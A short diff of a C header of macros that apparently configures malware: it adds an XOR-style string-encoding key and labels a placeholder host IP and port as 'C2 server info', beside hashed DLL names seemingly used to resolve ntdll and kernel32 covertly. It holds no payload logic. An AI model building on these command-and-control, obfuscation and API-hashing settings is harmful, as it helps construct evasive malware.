@@ -1,10 +1,12 @@
 #ifndef MACROS_YS
 #define MACROS_YS
 
+/*string encoding key*/
+#define ENKEY           0x05
 
+/*C2 server info*/
 #define HOST_IP         IPHERE
 #define HOST_PORT       PORTHERE
-
 /*DLLs HASHES*/
 #define NTDHASH         0x26ac37d5
 #define KRN32DL         0x23e6b043
